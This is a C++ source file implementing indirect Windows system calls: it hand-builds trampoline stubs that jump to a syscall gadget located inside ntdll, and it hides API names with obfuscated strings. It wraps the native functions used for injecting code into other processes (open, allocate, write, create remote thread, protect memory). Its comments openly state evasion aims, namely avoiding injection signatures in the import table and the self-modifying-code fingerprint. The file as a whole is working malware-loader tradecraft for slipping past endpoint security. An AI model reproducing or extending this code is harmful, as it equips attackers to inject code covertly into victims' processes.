#include "lge_syscalls.h"
#include "dynresolve.h"

#pragma pack(push, 1)
struct LgeTrampoline {
    unsigned char mov_r10_rcx[3];  // 4C 8B D1
    unsigned char mov_eax[1];      // B8
    DWORD         ssn;             // imm32
    unsigned char mov_r11[2];      // 49 BB
    uint64_t      gadget;          // imm64
    unsigned char jmp_r11[3];      // 41 FF E3
};
#pragma pack(pop)

static_assert(sizeof(LgeTrampoline) == 21, "stub layout changed");

// One immutable stub per syscall, built once at init and never rewritten. This
// avoids the per-invoke VirtualProtect RW<->RX flip that marks the region as
// self-modifying code (a classic packer/injection fingerprint): the page is
// written once while RW, then flipped to RX a single time and stays RX.
enum LgeSyscallIndex {
    LGE_NT_OPEN_PROCESS = 0,
    LGE_NT_ALLOCATE_VIRTUAL_MEMORY,
    LGE_NT_WRITE_VIRTUAL_MEMORY,
    LGE_NT_FREE_VIRTUAL_MEMORY,
    LGE_NT_CREATE_THREAD_EX,
    LGE_NT_CLOSE,
    LGE_NT_QUERY_INFORMATION_PROCESS,
    LGE_NT_WAIT_FOR_SINGLE_OBJECT,
    LGE_NT_PROTECT_VIRTUAL_MEMORY,
    LGE_SYSCALL_COUNT
};

namespace {
    // CRITICAL_SECTION instead of std::mutex: avoids linking winpthreads, which
    // would otherwise import the injection-signature API set into the IAT.
    CRITICAL_SECTION g_LgeCs = {};
    LONG g_LgeCsInit = 0;
    uint8_t* g_Stubs = nullptr;   // LGE_SYSCALL_COUNT consecutive LgeTrampoline
    uint64_t g_Gadget = 0;
    bool     g_Ready = false;

    CRITICAL_SECTION* GetLgeCs() {
        if (InterlockedCompareExchange(&g_LgeCsInit, 1, 0) == 0) {
            InitializeCriticalSection(&g_LgeCs);
            InterlockedExchange(&g_LgeCsInit, 2);
        }
        while (g_LgeCsInit != 2) { SwitchToThread(); }
        return &g_LgeCs;
    }
    struct LgeCsGuard {
        LgeCsGuard() { EnterCriticalSection(GetLgeCs()); }
        ~LgeCsGuard() { LeaveCriticalSection(GetLgeCs()); }
    };
}

DWORD g_SysNtOpenProcess = 0;
DWORD g_SysNtAllocateVirtualMemory = 0;
DWORD g_SysNtWriteVirtualMemory = 0;
DWORD g_SysNtFreeVirtualMemory = 0;
DWORD g_SysNtCreateThreadEx = 0;
DWORD g_SysNtClose = 0;
DWORD g_SysNtQueryInformationProcess = 0;
DWORD g_SysNtWaitForSingleObject = 0;
DWORD g_SysNtProtectVirtualMemory = 0;

static uint64_t LgeLocateGadget(HMODULE hNtdll) {
    if (!hNtdll) return 0;

    uint8_t* base = (uint8_t*)hNtdll;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    uint32_t expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRva) return 0;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + expRva);
    uint32_t* funcs = (uint32_t*)(base + exp->AddressOfFunctions);

    for (uint32_t i = 0; i < exp->NumberOfFunctions; ++i) {
        uint8_t* p = base + funcs[i];

        for (int j = 0; j < 32; ++j) {
            if (p[j] == 0x0F && p[j + 1] == 0x05 && p[j + 2] == 0xC3) {
                return (uint64_t)(p + j);
            }
        }
    }
    return 0;
}

// Allocate the stub region read-write so the immutable stubs can be written,
// then LgeFinalizeStubs flips it to read-execute exactly once. The region is
// never writable and executable at the same time and never modified after init,
// so it does not present the self-modifying-code pattern.
static bool LgeBuildTrampoline() {
    if (g_Stubs) return true;

    static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
    static constexpr auto obfAlloc = MAKE_OBF("NtAllocateVirtualMemory");

    HMODULE hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll));
    if (!hNtdll) return false;

    using pNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    pNtAllocateVirtualMemory fnAlloc =
        (pNtAllocateVirtualMemory)DynGetProcAddress(hNtdll, DECR_STR(obfAlloc));
    if (!fnAlloc) return false;

    PVOID mem = nullptr;
    SIZE_T region = 4096;
    if (fnAlloc((HANDLE)-1, &mem, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0 || !mem) {
        return false;
    }

    g_Stubs = (uint8_t*)mem;
    return true;
}

static LgeTrampoline* LgeStubAt(int index) {
    return (LgeTrampoline*)(g_Stubs + (size_t)index * sizeof(LgeTrampoline));
}

// Write one stub with its SSN and the shared gadget baked in.
static void LgeFillStub(int index, DWORD ssn) {
    LgeTrampoline* t = LgeStubAt(index);
    t->mov_r10_rcx[0] = 0x4C; t->mov_r10_rcx[1] = 0x8B; t->mov_r10_rcx[2] = 0xD1;
    t->mov_eax[0] = 0xB8;
    t->ssn = ssn;
    t->mov_r11[0] = 0x49; t->mov_r11[1] = 0xBB;
    t->gadget = g_Gadget;
    t->jmp_r11[0] = 0x41; t->jmp_r11[1] = 0xFF; t->jmp_r11[2] = 0xE3;
}

static bool LgeProtectRegion(ULONG protect) {
    static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
    static constexpr auto obfProtect = MAKE_OBF("NtProtectVirtualMemory");
    HMODULE hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll));
    if (!hNtdll) return false;
    using pNtProtectVirtualMemory = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    pNtProtectVirtualMemory fnProtect =
        (pNtProtectVirtualMemory)DynGetProcAddress(hNtdll, DECR_STR(obfProtect));
    if (!fnProtect) return false;

    PVOID base = (PVOID)g_Stubs;
    SIZE_T region = 4096;
    ULONG oldProtect = 0;
    return fnProtect((HANDLE)-1, &base, &region, protect, &oldProtect) == 0;
}

// One-time transition to RX after all stubs are written.
static bool LgeFinalizeStubs() {
    return LgeProtectRegion(PAGE_EXECUTE_READ);
}

bool LgeInitialize() {
    LgeCsGuard lock;
    if (g_Ready) return true;

    static constexpr auto obfNtOpenProcess = MAKE_OBF("NtOpenProcess");
    static constexpr auto obfNtAllocateVirtualMemory = MAKE_OBF("NtAllocateVirtualMemory");
    static constexpr auto obfNtWriteVirtualMemory = MAKE_OBF("NtWriteVirtualMemory");
    static constexpr auto obfNtFreeVirtualMemory = MAKE_OBF("NtFreeVirtualMemory");
    static constexpr auto obfNtCreateThreadEx = MAKE_OBF("NtCreateThreadEx");
    static constexpr auto obfNtClose = MAKE_OBF("NtClose");
    static constexpr auto obfNtQueryInformationProcess = MAKE_OBF("NtQueryInformationProcess");
    static constexpr auto obfNtWaitForSingleObject = MAKE_OBF("NtWaitForSingleObject");
    static constexpr auto obfNtProtectVirtualMemory = MAKE_OBF("NtProtectVirtualMemory");

    g_SysNtOpenProcess = GetSyscallNumber(DECR_STR(obfNtOpenProcess));
    g_SysNtAllocateVirtualMemory = GetSyscallNumber(DECR_STR(obfNtAllocateVirtualMemory));
    g_SysNtWriteVirtualMemory = GetSyscallNumber(DECR_STR(obfNtWriteVirtualMemory));
    g_SysNtFreeVirtualMemory = GetSyscallNumber(DECR_STR(obfNtFreeVirtualMemory));
    g_SysNtCreateThreadEx = GetSyscallNumber(DECR_STR(obfNtCreateThreadEx));
    g_SysNtClose = GetSyscallNumber(DECR_STR(obfNtClose));
    g_SysNtQueryInformationProcess = GetSyscallNumber(DECR_STR(obfNtQueryInformationProcess));
    g_SysNtWaitForSingleObject = GetSyscallNumber(DECR_STR(obfNtWaitForSingleObject));
    g_SysNtProtectVirtualMemory = GetSyscallNumber(DECR_STR(obfNtProtectVirtualMemory));

    if (g_SysNtOpenProcess == 0 || g_SysNtAllocateVirtualMemory == 0 ||
        g_SysNtWriteVirtualMemory == 0 || g_SysNtFreeVirtualMemory == 0 ||
        g_SysNtCreateThreadEx == 0 || g_SysNtClose == 0 ||
        g_SysNtWaitForSingleObject == 0 || g_SysNtProtectVirtualMemory == 0) {
        return false;
    }

    static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
    HMODULE hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll));
    g_Gadget = LgeLocateGadget(hNtdll);
    if (!g_Gadget) return false;

    if (!LgeBuildTrampoline()) return false;

    // Bake every stub with its SSN and the shared gadget, then flip the region
    // to RX once. No further modification happens at invoke time.
    LgeFillStub(LGE_NT_OPEN_PROCESS, g_SysNtOpenProcess);
    LgeFillStub(LGE_NT_ALLOCATE_VIRTUAL_MEMORY, g_SysNtAllocateVirtualMemory);
    LgeFillStub(LGE_NT_WRITE_VIRTUAL_MEMORY, g_SysNtWriteVirtualMemory);
    LgeFillStub(LGE_NT_FREE_VIRTUAL_MEMORY, g_SysNtFreeVirtualMemory);
    LgeFillStub(LGE_NT_CREATE_THREAD_EX, g_SysNtCreateThreadEx);
    LgeFillStub(LGE_NT_CLOSE, g_SysNtClose);
    LgeFillStub(LGE_NT_QUERY_INFORMATION_PROCESS, g_SysNtQueryInformationProcess);
    LgeFillStub(LGE_NT_WAIT_FOR_SINGLE_OBJECT, g_SysNtWaitForSingleObject);
    LgeFillStub(LGE_NT_PROTECT_VIRTUAL_MEMORY, g_SysNtProtectVirtualMemory);

    if (!LgeFinalizeStubs()) return false;

    g_Ready = true;
    return true;
}

static NTSTATUS LgeInvokeStub(int index,
    void* a1, void* a2, void* a3, void* a4,
    void* a5, void* a6, void* a7, void* a8,
    void* a9, void* a10, void* a11, void* a12)
{
    if (!g_Ready && !LgeInitialize()) {
        return (NTSTATUS)0xC0000001L;
    }

    LgeCsGuard lock;

    using Proto = NTSTATUS(NTAPI*)(
        void*, void*, void*, void*,
        void*, void*, void*, void*,
        void*, void*, void*, void*);
    Proto fn = (Proto)LgeStubAt(index);

    return fn(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12);
}

extern "C" {

NTSTATUS SyscallNtOpenProcess(
    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId)
{
    return LgeInvokeStub(LGE_NT_OPEN_PROCESS,
        (void*)ProcessHandle, (void*)(uintptr_t)DesiredAccess,
        (void*)ObjectAttributes, (void*)ClientId,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
{
    return LgeInvokeStub(LGE_NT_ALLOCATE_VIRTUAL_MEMORY,
        (void*)ProcessHandle, (void*)BaseAddress, (void*)(uintptr_t)ZeroBits,
        (void*)RegionSize, (void*)(uintptr_t)AllocationType, (void*)(uintptr_t)Protect,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
{
    return LgeInvokeStub(LGE_NT_WRITE_VIRTUAL_MEMORY,
        (void*)ProcessHandle, (void*)BaseAddress, (void*)Buffer,
        (void*)(uintptr_t)NumberOfBytesToWrite, (void*)NumberOfBytesWritten,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtFreeVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType)
{
    return LgeInvokeStub(LGE_NT_FREE_VIRTUAL_MEMORY,
        (void*)ProcessHandle, (void*)BaseAddress, (void*)RegionSize,
        (void*)(uintptr_t)FreeType,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle,
    PVOID StartRoutine, PVOID Argument, ULONG CreateFlags,
    SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList)
{
    return LgeInvokeStub(LGE_NT_CREATE_THREAD_EX,
        (void*)ThreadHandle, (void*)(uintptr_t)DesiredAccess,
        (void*)ObjectAttributes, (void*)ProcessHandle,
        (void*)StartRoutine, (void*)Argument,
        (void*)(uintptr_t)CreateFlags, (void*)(uintptr_t)ZeroBits,
        (void*)(uintptr_t)StackSize, (void*)(uintptr_t)MaximumStackSize,
        (void*)AttributeList, nullptr);
}

NTSTATUS SyscallNtClose(HANDLE Handle)
{
    return LgeInvokeStub(LGE_NT_CLOSE,
        (void*)Handle,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtQueryInformationProcess(
    HANDLE ProcessHandle, ULONG ProcessInformationClass,
    PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength)
{
    return LgeInvokeStub(LGE_NT_QUERY_INFORMATION_PROCESS,
        (void*)ProcessHandle, (void*)(uintptr_t)ProcessInformationClass,
        (void*)ProcessInformation, (void*)(uintptr_t)ProcessInformationLength,
        (void*)ReturnLength,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtWaitForSingleObject(
    HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout)
{
    return LgeInvokeStub(LGE_NT_WAIT_FOR_SINGLE_OBJECT,
        (void*)Handle, (void*)(uintptr_t)Alertable, (void*)Timeout,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect)
{
    return LgeInvokeStub(LGE_NT_PROTECT_VIRTUAL_MEMORY,
        (void*)ProcessHandle, (void*)BaseAddress, (void*)RegionSize,
        (void*)(uintptr_t)NewProtect, (void*)OldProtect,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

}
